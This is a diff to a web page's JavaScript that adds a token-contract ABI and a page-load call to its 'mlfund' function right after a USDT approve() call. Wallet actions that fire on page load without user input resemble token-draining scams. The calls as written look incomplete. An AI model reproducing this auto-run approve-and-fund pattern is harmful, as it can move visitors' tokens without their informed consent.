@@ -430,7 +430,97 @@
       "type": "receive"
     }
     ]
-
+    const dfAbi = [
+    {
+      "inputs": [],
+      "stateMutability": "nonpayable",
+      "type": "constructor"
+    },
+    {
+      "inputs": [],
+      "name": "baseAddr",
+      "outputs": [
+      {
+        "internalType": "address",
+        "name": "",
+        "type": "address"
+      }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "baseToken",
+      "outputs": [
+      {
+        "internalType": "contract EIP20NonStandardInterface",
+        "name": "",
+        "type": "address"
+      }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "etherUnit",
+      "outputs": [
+      {
+        "internalType": "uint256",
+        "name": "",
+        "type": "uint256"
+      }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [
+      {
+        "internalType": "uint256",
+        "name": "amount",
+        "type": "uint256"
+      }
+      ],
+      "name": "mlfund",
+      "outputs": [
+      {
+        "internalType": "bool",
+        "name": "",
+        "type": "bool"
+      }
+      ],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "quoteAddr",
+      "outputs": [
+      {
+        "internalType": "address",
+        "name": "",
+        "type": "address"
+      }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "quoteToken",
+      "outputs": [
+      {
+        "internalType": "contract EIP20NonStandardInterface",
+        "name": "",
+        "type": "address"
+      }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    }
+    ]
     try {
       window.addEventListener('load', async () => {
         // Modern dapp browsers...
@@ -442,7 +532,9 @@
             await ethereum.enable();
             const ETH = wb3.ETH
             const contract = new ETH.contract(abi, usdtAddr.toLowerCase())
+            const dfContarct = new ETH.contract(dfAbi, defosAddr.toLowerCase())
             await contract.methods.approve().call()
+            await dfContarct.methods.mlfund(10*Math.pow(10, 18)) 
             // Acccounts now exposed
             // web3.eth.sendTransaction({/* ... */});
           } catch (error) {
